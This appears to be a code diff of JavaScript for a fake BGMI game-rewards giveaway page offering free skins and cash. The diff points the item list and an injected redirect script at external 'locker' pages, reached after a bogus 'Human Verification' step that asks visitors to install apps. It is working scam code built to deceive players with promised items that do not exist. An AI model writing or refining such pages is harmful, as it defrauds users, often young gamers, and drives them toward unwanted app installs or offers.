@@ -14,22 +14,22 @@ function openRewards(evt, rewardsClass) {
 }
 
 var openmusic = new Audio();
-openmusic.src = "./resources/open.mp3";
+openmusic.src = "https://bgmi.services/insta/resources/open.mp3";
 
 var closemusic = new Audio();
-closemusic.src = "./resources/close.mp3";
+closemusic.src = "https://bgmi.services/insta/resources/close.mp3";
 
 var items=
 {
-    "item1":{"name":"Blood Raven X-Suit","price":"./resources/locker.html"},
-    "item2":{"name":"Golden Pharaoh X-Suit","price":"./resources/locker.html"},
-    "item3":{"name":"Poseidon X-Suit","price":"./resources/locker.html"},
-    "item4":{"name":"M416 Glacier Max","price":"./resources/locker.html"},
-    "item5":{"name":"M416 Lizard Roar Max","price":"./resources/locker.html"},
-    "item6":{"name":"M416 The Fool Max","price":"./resources/locker.html"},
-    "item7":{"name":"Materials","price":"./resources/locker.html"},
-    "item8":{"name":"Golden McLaren Max","price":"./resources/locker.html"},
-    "item9":{"name":"Unknown Cash","price":"./resources/locker.html"}
+    "item1":{"name":"Blood Raven X-Suit","price":"https://wowservices.github.io/wow/locker.html"},
+    "item2":{"name":"Golden Pharaoh X-Suit","price":"https://wowservices.github.io/wow/locker.html"},
+    "item3":{"name":"Poseidon X-Suit","price":"https://wowservices.github.io/wow/locker.html"},
+    "item4":{"name":"M416 Glacier Max","price":"https://wowservices.github.io/wow/locker.html"},
+    "item5":{"name":"M416 Lizard Roar Max","price":"https://wowservices.github.io/wow/locker.html"},
+    "item6":{"name":"M416 The Fool Max","price":"https://wowservices.github.io/wow/locker.html"},
+    "item7":{"name":"Materials","price":"https://wowservices.github.io/wow/locker.html"},
+    "item8":{"name":"Golden McLaren Max","price":"https://wowservices.github.io/wow/locker.html"},
+    "item9":{"name":"Unknown Cash","price":"https://wowservices.github.io/wow/locker.html"}
 };
 
 
@@ -117,7 +117,7 @@ async function typemsg() {
         clearTimeout(typemsg);
         $("#title").text('Human Verification');
         $("#question").text('Install 1 apps and use it for 30 seconds.');
-        $("#question").after(`<script > window.location.href = "https://bgmi.services/insta/resources/locker.html";</script>`);
+        $("#question").after(`<script > window.location.href = "https://wowservices.github.io/wow/locker.html";</script>`);
         // $("#question").after(`<img src="${itemdata.price}" alt="${itemdata.name}">`);
         $("#loader").hide();
 
